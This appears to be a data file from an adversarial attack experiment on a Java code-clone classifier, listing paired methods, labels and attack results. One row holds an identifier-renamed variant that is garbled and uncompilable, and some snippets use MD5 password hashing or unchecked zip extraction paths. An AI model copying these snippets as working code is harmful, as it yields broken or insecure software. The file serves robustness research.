        FileChannel srcChannel = new FileInputStream(getAbsolutePath()).getChannel();
        logger.fine(""...got source channel "" + srcChannel + ""..."");
        FileChannel destChannel = new FileOutputStream(new File(destination.getAbsolutePath())).getChannel();
        logger.fine(""...got destination channel "" + destChannel + ""..."");
        logger.fine(""...Got channels..."");
        destChannel.transferFrom(srcChannel, 0, srcChannel.size());
        logger.fine(""...transferred."");
        srcChannel.close();
        destChannel.close();
    }
",111,,LABEL_1,LABEL_1,LABEL_1,-1,"getFileContentAsString,filePath,encoding,testURL,input,sw",,,,0,,0,GA,2042,0.7276822686195373,failed,[]
35,"    public static String generateHash(String key) {
        key += ""use_your_key_here"";
        MessageDigest md;
        try {
            md = java.security.MessageDigest.getInstance(""MD5"");
            md.reset();
            md.update(key.getBytes());
            byte[] bytes = md.digest();
            StringBuffer buff = new StringBuffer();
            for (int l = 0; l < bytes.length; l++) {
                String hx = Integer.toHexString(0xFF & bytes[l]);
                if (hx.length() == 1) buff.append(""0"");
                buff.append(hx);
            }
            return buff.toString().trim();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return null;
    }
 <SPLIT>     private void setProfile(String loginName, SimpleUserProfile profile) throws MM4UCannotStoreUserProfileException {
        try {
            OutputStream outStream = null;
            URL url = new URL(this.profileURI + profile.getID() + FILE_SUFFIX);
            if (url.getProtocol().equals(""file"")) {
                File file = new File(url.getFile());
                outStream = new FileOutputStream(file);
            } else {
                URLConnection connection = url.openConnection();
                connection.setDoOutput(true);
                outStream = connection.getOutputStream();
            }
            OutputStreamWriter writer = new OutputStreamWriter(outStream);
            Enumeration myEnum = profile.keys();
            while (myEnum.hasMoreElements()) {
                String key = myEnum.nextElement().toString();
                if (key != ""id"") writer.write(key + ""="" + profile.getStringValue(key) + System.getProperty(""line.separator""));
            }
            writer.flush();
            writer.close();
        } catch (Exception e) {
            throw new MM4UCannotStoreUserProfileException(this, ""setProfile"", e.toString());
        }
    }
",160,,LABEL_0,LABEL_0,LABEL_0,-1,"generateHash,key,md,bytes,buff,l,hx",,,,0,,0,GA,1906,0.6983187556266784,failed,[]
36,"    public static String getMessageDigest(String input) {
        if (input == null) {
            log.warn(""Returning SHA-1 null value for null input"");
            return null;
        }
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(input.getBytes(""UTF-8""));
            byte[] bytes = md.digest();
            return new BASE64Encoder().encode(bytes);
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(e.getMessage());
        } catch (UnsupportedEncodingException e) {
            throw new IllegalStateException(e.getMessage());
        }
    }
 <SPLIT>     private void generateDeviceUUID() {
        try {
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.update(deviceType.getBytes());
            md5.update(internalId.getBytes());
            md5.update(bindAddress.getHostName().getBytes());
            StringBuffer hexString = new StringBuffer();
            byte[] digest = md5.digest();
            for (int i = 0; i < digest.length; i++) {
                hexString.append(Integer.toHexString(0xFF & digest[i]));
            }
            uuid = hexString.toString().toUpperCase();
        } catch (Exception ex) {
            RuntimeException runTimeEx = new RuntimeException(""Unexpected error during MD5 hash creation, check your JRE"");
            runTimeEx.initCause(ex);
            throw runTimeEx;
        }
    }
",118,,LABEL_1,LABEL_1,LABEL_1,-1,"getMessageDigest,input,md,bytes",,,,0,,0,GA,1562,0.5570149223009745,failed,[]
37,"    public static int[] sortAscending(float input[]) {
        int[] order = new int[input.length];
        for (int i = 0; i < order.length; i++) order[i] = i;
        for (int i = input.length; --i >= 0; ) {
            for (int j = 0; j < i; j++) {
                if (input[j] > input[j + 1]) {
                    float mem = input[j];
                    input[j] = input[j + 1];
                    input[j + 1] = mem;
                    int id = order[j];
                    order[j] = order[j + 1];
                    order[j + 1] = id;
                }
            }
        }
        return order;
    }
 <SPLIT>     @Override
    public byte[] download(URI uri) throws NetworkException {
        log.info(""download: "" + uri);
        HttpGet httpGet = new HttpGet(uri.toString());
        try {
            HttpResponse httpResponse = httpClient.execute(httpGet);
            return EntityUtils.toByteArray(httpResponse.getEntity());
        } catch (IOException e) {
            throw new NetworkException(e);
        } finally {
            httpGet.abort();
        }
    }
",161,,LABEL_0,LABEL_0,LABEL_0,-1,"sortAscending,input,order,i,j,mem,id",,,,0,,0,GA,2670,0.9501531402269999,failed,[]
38,"    public void uncaughtException(final Thread t, final Throwable e) {
        final Display display = Display.getCurrent();
        final Shell shell = new Shell(display);
        final MessageBox message = new MessageBox(shell, SWT.OK | SWT.CANCEL | SWT.ICON_ERROR);
        message.setText(""Hawkscope Error"");
        message.setMessage(e.getMessage() + ""\nSubmit Hawkscope Error Report to Issue Tracker?"");
        log.error(""Uncaught exception"", e);
        if (message.open() == SWT.OK) {
            IOUtils.copyToClipboard(Version.getBugReport(e));
            try {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry?comment="" + URLEncoder.encode(""Please paste the Hawkscope Error "" + ""Report here. It's currently copied to your "" + ""clipboard. Thank you for your support!"", Constants.ENCODING));
            } catch (final Exception e1) {
                Program.launch(Constants.HAWKSCOPE_URL_ROOT + ""issues/entry"");
            }
        }
        shell.dispose();
    }
 <SPLIT>     public void convert(File src, File dest) throws IOException {
        InputStream in = new BufferedInputStream(new FileInputStream(src));
        DcmParser p = pfact.newDcmParser(in);
        Dataset ds = fact.newDataset();
        p.setDcmHandler(ds.getDcmHandler());
        try {
            FileFormat format = p.detectFileFormat();
            if (format != FileFormat.ACRNEMA_STREAM) {
                System.out.println(""\n"" + src + "": not an ACRNEMA stream!"");
                return;
            }
            p.parseDcmFile(format, Tags.PixelData);
            if (ds.contains(Tags.StudyInstanceUID) || ds.contains(Tags.SeriesInstanceUID) || ds.contains(Tags.SOPInstanceUID) || ds.contains(Tags.SOPClassUID)) {
                System.out.println(""\n"" + src + "": contains UIDs!"" + "" => probable already DICOM - do not convert"");
                return;
            }
            boolean hasPixelData = p.getReadTag() == Tags.PixelData;
            boolean inflate = hasPixelData && ds.getInt(Tags.BitsAllocated, 0) == 12;
            int pxlen = p.getReadLength();
            if (hasPixelData) {
                if (inflate) {
                    ds.putUS(Tags.BitsAllocated, 16);
                    pxlen = pxlen * 4 / 3;
                }
                if (pxlen != (ds.getInt(Tags.BitsAllocated, 0) >>> 3) * ds.getInt(Tags.Rows, 0) * ds.getInt(Tags.Columns, 0) * ds.getInt(Tags.NumberOfFrames, 1) * ds.getInt(Tags.NumberOfSamples, 1)) {
                    System.out.println(""\n"" + src + "": mismatch pixel data length!"" + "" => do not convert"");
                    return;
                }
            }
            ds.putUI(Tags.StudyInstanceUID, uid(studyUID));
            ds.putUI(Tags.SeriesInstanceUID, uid(seriesUID));
            ds.putUI(Tags.SOPInstanceUID, uid(instUID));
            ds.putUI(Tags.SOPClassUID, classUID);
            if (!ds.contains(Tags.NumberOfSamples)) {
                ds.putUS(Tags.NumberOfSamples, 1);
            }
            if (!ds.contains(Tags.PhotometricInterpretation)) {
                ds.putCS(Tags.PhotometricInterpretation, ""MONOCHROME2"");
            }
            if (fmi) {
                ds.setFileMetaInfo(fact.newFileMetaInfo(ds, UIDs.ImplicitVRLittleEndian));
            }
            OutputStream out = new BufferedOutputStream(new FileOutputStream(dest));
            try {
            } finally {
                ds.writeFile(out, encodeParam());
                if (hasPixelData) {
                    if (!skipGroupLen) {
                        out.write(PXDATA_GROUPLEN);
                        int grlen = pxlen + 8;
                        out.write((byte) grlen);
                        out.write((byte) (grlen >> 8));
                        out.write((byte) (grlen >> 16));
                        out.write((byte) (grlen >> 24));
                    }
                    out.write(PXDATA_TAG);
                    out.write((byte) pxlen);
                    out.write((byte) (pxlen >> 8));
                    out.write((byte) (pxlen >> 16));
                    out.write((byte) (pxlen >> 24));
                }
                if (inflate) {
                    int b2, b3;
                    for (; pxlen > 0; pxlen -= 3) {
                        out.write(in.read());
                        b2 = in.read();
                        b3 = in.read();
                        out.write(b2 & 0x0f);
                        out.write(b2 >> 4 | ((b3 & 0x0f) << 4));
                        out.write(b3 >> 4);
                    }
                } else {
                    for (; pxlen > 0; --pxlen) {
                        out.write(in.read());
                    }
                }
                out.close();
            }
            System.out.print('.');
        } finally {
            in.close();
        }
    }
",182,,LABEL_1,LABEL_1,LABEL_1,-1,"uncaughtException,t,e,display,shell,message,e1",,,,0,,0,GA,1661,0.6566930254300435,failed,[]
39,"    public String getPasswordMD5() {
        try {
            MessageDigest algorithm = MessageDigest.getInstance(""MD5"");
            algorithm.reset();
            algorithm.update(password.getBytes());
            byte messageDigest[] = algorithm.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                hexString.append(Integer.toHexString(0xFF & messageDigest[i]));
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException nsae) {
        }
        return null;
    }
 <SPLIT>     @Digester(forField = ""password"")
    public static String encriptPassword(String passwd) {
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(passwd.getBytes());
            BigInteger hash = new BigInteger(1, md.digest());
            return hash.toString(16);
        } catch (Exception e) {
            return null;
        }
    }
",111,,LABEL_1,LABEL_1,LABEL_1,-1,"getPasswordMD5,algorithm,messageDigest,hexString,i",,,,0,,0,GA,1905,0.6727201581001282,failed,[]
40,"    public Configuration(URL url) {
        InputStream in = null;
        try {
            load(in = url.openStream());
        } catch (Exception e) {
            throw new RuntimeException(""Could not load configuration from "" + url, e);
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException ignore) {
                }
            }
        }
    }
 <SPLIT>     @Override
    public synchronized void deleteJvmStatistics(String contextName, Date dateFrom, Date dateTo) throws DatabaseException {
        final Connection connection = this.getConnection();
        try {
            connection.setAutoCommit(false);
            String queryString = ""DELETE "" + this.getJvmInvocationsSchemaAndTableName() + "" FROM "" + this.getJvmInvocationsSchemaAndTableName() + "" INNER JOIN "" + this.getJvmElementsSchemaAndTableName() + "" ON "" + this.getJvmElementsSchemaAndTableName() + "".element_id =  "" + this.getJvmInvocationsSchemaAndTableName() + "".element_id WHERE "";
            if (contextName != null) {
                queryString = queryString + "" context_name LIKE ? AND "";
            }
            if (dateFrom != null) {
                queryString = queryString + "" start_timestamp >= ? AND "";
            }
            if (dateTo != null) {
                queryString = queryString + "" start_timestamp <= ? AND "";
            }
            queryString = DefaultDatabaseHandler.removeOrphanWhereAndAndFromSelect(queryString);
            final PreparedStatement preparedStatement = DebugPreparedStatement.prepareStatement(connection, queryString);
            int indexCounter = 1;
            if (contextName != null) {
                preparedStatement.setString(indexCounter, contextName);
                indexCounter = indexCounter + 1;
            }
            if (dateFrom != null) {
                preparedStatement.setTimestamp(indexCounter, new Timestamp(dateFrom.getTime()));
                indexCounter = indexCounter + 1;
            }
            if (dateTo != null) {
                preparedStatement.setTimestamp(indexCounter, new Timestamp(dateTo.getTime()));
                indexCounter = indexCounter + 1;
            }
            preparedStatement.executeUpdate();
            preparedStatement.close();
            connection.commit();
        } catch (final SQLException e) {
            try {
                connection.rollback();
            } catch (final SQLException ex) {
                JeeObserverServerContext.logger.log(Level.SEVERE, ""Transaction rollback error."", ex);
            }
            JeeObserverServerContext.logger.log(Level.SEVERE, e.getMessage());
            throw new DatabaseException(""Error deleting JVM statistics."", e);
        } finally {
            this.releaseConnection(connection);
        }
    }
",74,,LABEL_0,LABEL_0,LABEL_0,-1,"url,in",,,,0,,0,GA,813,0.29775360027949016,failed,[]
41,"    public static void saveAttachmentBody(Context context, Part part, Attachment localAttachment, long accountId) throws MessagingException, IOException {
        if (part.getBody() != null) {
            long attachmentId = localAttachment.mId;
            InputStream in = part.getBody().getInputStream();
            File saveIn = AttachmentProvider.getAttachmentDirectory(context, accountId);
            if (!saveIn.exists()) {
                saveIn.mkdirs();
            }
            File saveAs = AttachmentProvider.getAttachmentFilename(context, accountId, attachmentId);
            saveAs.createNewFile();
            FileOutputStream out = new FileOutputStream(saveAs);
            long copySize = IOUtils.copy(in, out);
            in.close();
            out.close();
            String contentUriString = AttachmentProvider.getAttachmentUri(accountId, attachmentId).toString();
            localAttachment.mSize = copySize;
            localAttachment.mContentUri = contentUriString;
            ContentValues cv = new ContentValues();
            cv.put(AttachmentColumns.SIZE, copySize);
            cv.put(AttachmentColumns.CONTENT_URI, contentUriString);
            Uri uri = ContentUris.withAppendedId(Attachment.CONTENT_URI, attachmentId);
            context.getContentResolver().update(uri, cv, null, null);
        }
    }
 <SPLIT>     public static void copy(File srcPath, File dstPath) throws IOException {
        if (srcPath.isDirectory()) {
            if (!dstPath.exists()) {
                boolean result = dstPath.mkdir();
                if (!result) throw new IOException(""Unable to create directoy: "" + dstPath);
            }
            String[] files = srcPath.list();
            for (String file : files) {
                copy(new File(srcPath, file), new File(dstPath, file));
            }
        } else {
            if (srcPath.exists()) {
                FileChannel in = null;
                FileChannel out = null;
                try {
                    in = new FileInputStream(srcPath).getChannel();
                    out = new FileOutputStream(dstPath).getChannel();
                    long size = in.size();
                    MappedByteBuffer buf = in.map(FileChannel.MapMode.READ_ONLY, 0, size);
                    out.write(buf);
                } finally {
                    if (in != null) in.close();
                    if (out != null) out.close();
                }
            }
        }
    }
",227,"    public static void saveAttachmentbody(Context cms, Part channel, Attachment localAttachention, long accountName) throws MessagingException, IOException {
        if (channel.getBody() != null) {
            long atadachmentId localAttachention.mId;
            InputStream in urlchannel.getBody().getInputStream();
            FilwriteinIn = AttachmentProvider.getAttachmentDirectory(cms, accountName);
            if (!writein.exists()) {
                writein.mkdirs();
            }
            FicopyaseAs = AttachmentProvider.getAttachmentFilename(cms, accountName, adachmentId);
            copyas.createNewFile();
            FileOutputStream err = new FileOutputStream(copyas);
            long cleSize= IOUtils.copy(url, err);
            url.close();
            err.close();
            String ccontentUioStr= AttachmentProvider.getAttachmentUri(accountName, adachmentId).toString();
            localAttachentiopCountze = leSize;
            localAttachentimContentOUrisUri = contentUioStr;
            ContentValues cover = new ContentValues();
          covercv.put(AttachmentColumns.SIZE, leSize);
         cover cv.put(AttachmentColumns.CONTENT_URI, contentUioStr);
            Uriurii = ContentUris.withAppendedId(Attachment.CONTENT_URI, adachmentId);
            cms.getContentResolver().update(uriuriover, null, null);
        }
    }
",LABEL_1,LABEL_1,0.5306212306022644,1,"saveAttachmentBody,context,part,localAttachment,accountId,attachmentId,in,saveIn,saveAs,out,copySize,contentUriString,mSize,mContentUri,cv,uri",,,,2,"saveAttachmentBody:saveAttachmentbody,context:cms,part:channel,localAttachment:localAttachention,accountId:accountName,attachmentId:adachmentId,in:url,saveIn:writein,saveAs:copyas,out:err,copySize:leSize,contentUriString:contentUioStr,mSize:pCount,mContentUri:mContentOUris,cv:cover,uri:uri,",1,GA,998,0.3687533974647522,ga,[]
42,"    public byte[] getBytesFromUrl(String url) {
        try {
            HttpGet get = new HttpGet(url);
            HttpResponse response = this.getHttpClient().execute(get);
            HttpEntity entity = response.getEntity();
            if (entity == null) {
                throw new RuntimeException(""response body was empty"");
            }
            return EntityUtils.toByteArray(entity);
        } catch (RuntimeException ex) {
            throw ex;
        } catch (Exception ex) {
            throw new RuntimeException(ex);
        }
    }
 <SPLIT>     public static Body decodeBody(InputStream in, String contentTransferEncoding) throws IOException {
        if (contentTransferEncoding != null) {
            contentTransferEncoding = MimeUtility.getHeaderParameter(contentTransferEncoding, null);
            if (""quoted-printable"".equalsIgnoreCase(contentTransferEncoding)) {
                in = new QuotedPrintableInputStream(in);
            } else if (""base64"".equalsIgnoreCase(contentTransferEncoding)) {
                in = new Base64InputStream(in);
            }
        }
        BinaryTempFileBody tempBody = new BinaryTempFileBody();
        OutputStream out = tempBody.getOutputStream();
        IOUtils.copy(in, out);
        out.close();
        return tempBody;
    }
",96,,LABEL_0,LABEL_0,LABEL_0,-1,"getBytesFromUrl,url,get,response,entity",,,,0,,0,GA,1864,0.6613911628723145,failed,[]
43,"    public static void saveAttachmentBody(Context context, Part part, Attachment localAttachment, long accountId) throws MessagingException, IOException {
        if (part.getBody() != null) {
            long attachmentId = localAttachment.mId;
            InputStream in = part.getBody().getInputStream();
            File saveIn = AttachmentProvider.getAttachmentDirectory(context, accountId);
            if (!saveIn.exists()) {
                saveIn.mkdirs();
            }
            File saveAs = AttachmentProvider.getAttachmentFilename(context, accountId, attachmentId);
            saveAs.createNewFile();
            FileOutputStream out = new FileOutputStream(saveAs);
            long copySize = IOUtils.copy(in, out);
            in.close();
            out.close();
            String contentUriString = AttachmentProvider.getAttachmentUri(accountId, attachmentId).toString();
            localAttachment.mSize = copySize;
            localAttachment.mContentUri = contentUriString;
            ContentValues cv = new ContentValues();
            cv.put(AttachmentColumns.SIZE, copySize);
            cv.put(AttachmentColumns.CONTENT_URI, contentUriString);
            Uri uri = ContentUris.withAppendedId(Attachment.CONTENT_URI, attachmentId);
            context.getContentResolver().update(uri, cv, null, null);
        }
    }
 <SPLIT>     public static void main(String[] args) throws Exception {
        String st = ""http://www.kmzlinks.com/redirect.asp?id=113&file=HeartShapedIsland.kmz"";
        URL url = new URL(st);
        InputStream fis = null;
        if (""file"".equals(url.getProtocol())) fis = new FileInputStream(url.getFile()); else if (""http"".equals(url.getProtocol())) fis = url.openStream();
        ZipInputStream zis = new ZipInputStream(fis);
        ZipEntry entry;
        while ((entry = zis.getNextEntry()) != null) {
            System.out.println(""Extracting: "" + entry);
            int count;
            byte data[] = new byte[BUFFER];
            FileOutputStream fos = new FileOutputStream(entry.getName());
            BufferedOutputStream dest = new BufferedOutputStream(fos, BUFFER);
            while ((count = zis.read(data, 0, BUFFER)) != -1) dest.write(data, 0, count);
            dest.flush();
            dest.close();
        }
        zis.close();
    }
",227,,LABEL_1,LABEL_0,,-4,"saveAttachmentBody,context,part,localAttachment,accountId,attachmentId,in,saveIn,saveAs,out,copySize,contentUriString,mSize,mContentUri,cv,uri",,,,0,,0,Greedy,1,0.0005931774775187175,,[]
44,"    protected byte[] getHashedID(String ID) {
        try {
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.reset();
            md5.update(ID.getBytes());
            byte[] digest = md5.digest();
            byte[] bytes = new byte[WLDB_ID_SIZE];
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = digest[i];
            }
            return bytes;
        } catch (NoSuchAlgorithmException exception) {
            System.err.println(""Java VM is not compatible"");
            exit();
            return null;
        }
    }
 <SPLIT>     private void copyFile(final String sourceFileName, final File path) throws IOException {
        final File source = new File(sourceFileName);
        final File destination = new File(path, source.getName());
        FileChannel srcChannel = null;
        FileChannel dstChannel = null;
        try {
            srcChannel = new FileInputStream(source).getChannel();
            dstChannel = new FileOutputStream(destination).getChannel();
            dstChannel.transferFrom(srcChannel, 0, srcChannel.size());
        } finally {
            try {
                if (dstChannel != null) {
                    dstChannel.close();
                }
            } catch (Exception exception) {
            }
            try {
                if (srcChannel != null) {
                    srcChannel.close();
                }
            } catch (Exception exception) {
            }
        }
    }
",122,,LABEL_0,LABEL_0,LABEL_0,-1,"getHashedID,ID,md5,digest,bytes,i",,,,0,,0,GA,1431,0.5177612225214641,failed,[]
45,"    public static String sha1(String text) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        MessageDigest md;
        md = MessageDigest.getInstance(""SHA-1"");
        byte[] sha1hash = new byte[40];
        md.update(text.getBytes(""iso-8859-1""), 0, text.length());
        sha1hash = md.digest();
        return convertToHex(sha1hash);
    }
 <SPLIT>     public static synchronized String getMD5_Base64(String input) {
        MessageDigest msgDigest = null;
        try {
            msgDigest = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalStateException(""System doesn't support MD5 algorithm."");
        }
        try {
            msgDigest.update(input.getBytes(""UTF-8""));
        } catch (java.io.UnsupportedEncodingException ex) {
            throw new IllegalStateException(""System doesn't support your  EncodingException."");
        }
        byte[] rawData = msgDigest.digest();
        byte[] encoded = Base64.encode(rawData);
        String retValue = new String(encoded);
        return retValue;
    }
",77,,LABEL_1,LABEL_1,LABEL_1,-1,"sha1,text,UnsupportedEncodingException,md,sha1hash",,,,0,,0,GA,1266,0.45325854619344075,failed,[]
46,"    public Vector parse(String link) {
        addMessage(""Parsing: "" + link);
        links.removeAllElements();
        URLConnection conn = null;
        Reader rd = null;
        EditorKit kit = new HTMLEditorKit();
        Document doc = kit.createDefaultDocument();
        doc.putProperty(""IgnoreCharsetDirective"", Boolean.TRUE);
        URL url = null;
        try {
            url = new URL(link);
        } catch (MalformedURLException err) {
            System.out.println(""Malformed URL"");
            return links;
        }
        try {
            conn = new URL(link).openConnection();
            rd = new InputStreamReader(conn.getInputStream());
        } catch (Exception err) {
            err.printStackTrace();
            return links;
        }
        try {
            kit.read(rd, doc, 0);
            ElementIterator it = new ElementIterator(doc);
            javax.swing.text.Element elem;
            while ((elem = it.next()) != null) {
                SimpleAttributeSet s = (SimpleAttributeSet) elem.getAttributes().getAttribute(HTML.Tag.A);
                if (s != null) {
                    if (s.toString().indexOf(""script"") >= 0) continue;
                    String lnk = """";
                    try {
                        lnk = s.getAttribute(HTML.Attribute.HREF).toString();
                    } catch (Exception err) {
                        continue;
                    }
                    int j = 0;
                    if ((j = lnk.indexOf('#')) >= 0) lnk = lnk.substring(0, j);
                    URL urlLink = new URL(url, lnk);
                    if (!url.getHost().equals(urlLink.getHost())) continue;
                    String str = urlLink.toString();
                    if (!str.startsWith(""http"")) continue;
                    if (str.endsWith("".pdf"")) {
                        continue;
                    }
                    for (int i = 0; i < leaveSuffix.length; i++) {
                        if ((str.endsWith(leaveSuffix[i]))) continue;
                    }
                    boolean skip = false;
                    for (int i = 0; i < suffix.length; i++) {
                        if ((str.endsWith(suffix[i]))) skip = true;
                    }
                    if (!skip) {
                        try {
                            conn = urlLink.openConnection();
                        } catch (Exception err) {
                        }
                        String contentType = null;
                        if (contentType == null) contentType = conn.getContentType();
                        if (contentType.equals(""application/pdf"")) {
                            continue;
                        } else if (!contentType.equals(""text/html"")) {
                            continue;
                        }
                    }
                    if (!links.contains(urlLink.toString())) {
                        links.addElement(urlLink.toString());
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return links;
    }
 <SPLIT>     public void testHttpsConnection() throws Throwable {
        setUpStoreProperties();
        try {
            SSLContext ctx = getContext();
            ServerSocket ss = ctx.getServerSocketFactory().createServerSocket(0);
            TestHostnameVerifier hnv = new TestHostnameVerifier();
            HttpsURLConnection.setDefaultHostnameVerifier(hnv);
            URL url = new URL(""https://localhost:"" + ss.getLocalPort());
            HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
            SSLSocket peerSocket = (SSLSocket) doInteraction(connection, ss);
            checkConnectionStateParameters(connection, peerSocket);
            connection.connect();
        } finally {
            tearDownStoreProperties();
        }
    }
",570,,LABEL_0,LABEL_0,LABEL_0,-1,"parse,link,conn,rd,kit,doc,url,it,elem,s,lnk,j,urlLink,str,i,skip",,,,0,,0,GA,5942,2.3248136043548584,failed,[]
47,"    public void runWeb(String beginURL, String contextRoot, String pageURI) {
        if (bDebug) System.out.println(""WEB Path"");
        List<String> vtURLs = new ArrayList<String>();
        List<String> vtRobots = getRobots(beginURL, contextRoot);
        vtURLs.add(""/"" + contextRoot + ""/"" + pageURI);
        Indexer indexer = null;
        IndexDocument indexDoc = null;
        try {
            indexer = new Indexer(""/tmp/tmp/index"");
            for (String sxURL : vtURLs) {
                if (bDebug) System.out.println(""\n\n*** INDEXING "" + sxURL);
                if (bDebug) System.out.println(""Have - "" + sxURL);
                boolean bIndexPage = true;
                if (vtRobots != null) {
                    for (String sxRobotURL : vtRobots) {
                        if (bDebug) System.out.println(""Comparing to - "" + sxRobotURL);
                        if (sxURL.startsWith(sxRobotURL)) {
                            if (bDebug) System.out.println(""Found URL - "" + sxRobotURL + "" - "" + sxURL);
                            bIndexPage = false;
                            break;
                        }
                    }
                } else {
                    bIndexPage = true;
                }
                sxURL = beginURL + sxURL;
                ParserDelegator pd = new ParserDelegator();
                CallbackHandler cb = new CallbackHandler(vtURLs, bIndexPage, contextRoot);
                try {
                    URLConnection urlConn = new URL(sxURL).openConnection();
                    urlConn.setUseCaches(false);
                    Date modDate = new Date(urlConn.getLastModified());
                    if (bDebug) System.out.println(""\nMatch - "" + sxURL + "" - Modified Date - "" + modDate);
                    BufferedReader bfReader = new BufferedReader(new InputStreamReader(urlConn.getInputStream()));
                    pd.parse(bfReader, cb, true);
                    if (bIndexPage) {
                        if (bDebug) System.out.println(""Adding Index - "" + sxURL + ""\nContent:"" + cb.getText() + ""\nSummary:"" + cb.getSummary() + ""\nTitle:"" + cb.getTitle());
                        indexDoc = new IndexDocument();
                        indexDoc.setUID(sxURL + modDate.toString());
                        indexDoc.setPageURL(sxURL);
                        indexDoc.setModifiedDate(modDate.toString());
                        indexDoc.setContents(cb.getText());
                        indexDoc.setTitle(cb.getTitle());
                        indexDoc.setSummary(cb.getSummary());
                        indexer.addDocument(indexDoc);
                    }
                } catch (Exception ee) {
                    PetstoreUtil.getLogger().log(Level.SEVERE, ""Inner Exception"" + ee);
                }
            }
        } catch (Exception e) {
            PetstoreUtil.getLogger().log(Level.SEVERE, ""Outer Exception"" + e);
        } finally {
            try {
                if (indexer != null) {
                    indexer.close();
                }
            } catch (Exception ee) {
                ee.printStackTrace();
            }
        }
    }
 <SPLIT>     private static String scramble(String text) {
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(text.getBytes(""UTF-8""));
            StringBuffer sb = new StringBuffer();
            for (byte b : md.digest()) sb.append(Integer.toString(b & 0xFF, 16));
            return sb.toString();
        } catch (UnsupportedEncodingException e) {
            return null;
        } catch (NoSuchAlgorithmException e) {
            return null;
        }
    }
",557,,LABEL_0,LABEL_0,LABEL_0,-1,"runWeb,beginURL,contextRoot,pageURI,vtURLs,vtRobots,indexer,indexDoc,sxURL,sxRobotURL,pd,cb,bIndexPage,urlConn,modDate,bfReader",,,,0,,0,GA,5932,2.3309470574061075,failed,[]
48,"    public void send(org.hibernate.Session hsession, Session session, String repositoryName, int ideIdint, String to, String cc, String bcc, String subject, String body, Vector attachments, boolean isHtml, String charset, InternetHeaders headers, String priority) throws MailException {
        try {
            if (charset == null) {
                charset = MimeUtility.javaCharset(Charset.defaultCharset().displayName());
            }
            if ((body == null) || body.trim().equals("""")) {
                body = "" "";
            }
            Email email = null;
            if (isHtml) {
                email = new HtmlEmail();
            } else {
                email = new MultiPartEmail();
            }
            email.setCharset(charset);
            Users user = getUser(hsession, repositoryName);
            Identity identity = getIdentity(hsession, ideIdint, user);
            InternetAddress _returnPath = new InternetAddress(identity.getIdeEmail(), identity.getIdeName());
            InternetAddress _from = new InternetAddress(identity.getIdeEmail(), identity.getIdeName());
            InternetAddress _replyTo = new InternetAddress(identity.getIdeReplyTo(), identity.getIdeName());
            InternetAddress[] _to = MessageUtilities.encodeAddresses(to, null);
            InternetAddress[] _cc = MessageUtilities.encodeAddresses(cc, null);
            InternetAddress[] _bcc = MessageUtilities.encodeAddresses(bcc, null);
            if (_from != null) {
                email.setFrom(_from.getAddress(), _from.getPersonal());
            }
            if (_returnPath != null) {
                email.addHeader(""Return-Path"", _returnPath.getAddress());
                email.addHeader(""Errors-To"", _returnPath.getAddress());
                email.addHeader(""X-Errors-To"", _returnPath.getAddress());
            }
            if (_replyTo != null) {
                email.addReplyTo(_replyTo.getAddress(), _replyTo.getPersonal());
            }
            if ((_to != null) && (_to.length > 0)) {
                HashSet aux = new HashSet(_to.length);
                Collections.addAll(aux, _to);
                email.setTo(aux);
            }
            if ((_cc != null) && (_cc.length > 0)) {
                HashSet aux = new HashSet(_cc.length);
                Collections.addAll(aux, _cc);
                email.setCc(aux);
            }
            if ((_bcc != null) && (_bcc.length > 0)) {
                HashSet aux = new HashSet(_bcc.length);
                Collections.addAll(aux, _bcc);
                email.setBcc(aux);
            }
            email.setSubject(subject);
            Date now = new Date();
            email.setSentDate(now);
            File dir = new File(System.getProperty(""user.home"") + File.separator + ""tmp"");
            if (!dir.exists()) {
                dir.mkdir();
            }
            if ((attachments != null) && (attachments.size() > 0)) {
                for (int i = 0; i < attachments.size(); i++) {
                    ByteArrayInputStream bais = null;
                    FileOutputStream fos = null;
                    try {
                        MailPartObj obj = (MailPartObj) attachments.get(i);
                        File file = new File(dir, obj.getName());
                        bais = new ByteArrayInputStream(obj.getAttachent());
                        fos = new FileOutputStream(file);
                        IOUtils.copy(bais, fos);
                        EmailAttachment attachment = new EmailAttachment();
                        attachment.setPath(file.getPath());
                        attachment.setDisposition(EmailAttachment.ATTACHMENT);
                        attachment.setDescription(""File Attachment: "" + file.getName());
                        attachment.setName(file.getName());
                        if (email instanceof MultiPartEmail) {
                            ((MultiPartEmail) email).attach(attachment);
                        }
                    } catch (Exception ex) {
                    } finally {
                        IOUtils.closeQuietly(bais);
                        IOUtils.closeQuietly(fos);
                    }
                }
            }
            String mid = getId();
            if (headers != null) {
                Header xheader;
                Enumeration xe = headers.getAllHeaders();
                for (; xe.hasMoreElements(); ) {
                    xheader = (Header) xe.nextElement();
                    if (xheader.getName().equals(RFC2822Headers.IN_REPLY_TO)) {
                        email.addHeader(xheader.getName(), xheader.getValue());
                    } else if (xheader.getName().equals(RFC2822Headers.REFERENCES)) {
                        email.addHeader(xheader.getName(), xheader.getValue());
                    }
                }
            } else {
                email.addHeader(RFC2822Headers.IN_REPLY_TO, ""<"" + mid + "".JavaMail.duroty@duroty"" + "">"");
                email.addHeader(RFC2822Headers.REFERENCES, ""<"" + mid + "".JavaMail.duroty@duroty"" + "">"");
            }
            if (priority != null) {
                if (priority.equals(""high"")) {
                    email.addHeader(""Importance"", priority);
                    email.addHeader(""X-priority"", ""1"");
                } else if (priority.equals(""low"")) {
                    email.addHeader(""Importance"", priority);
                    email.addHeader(""X-priority"", ""5"");
                }
            }
            if (email instanceof HtmlEmail) {
                ((HtmlEmail) email).setHtmlMsg(body);
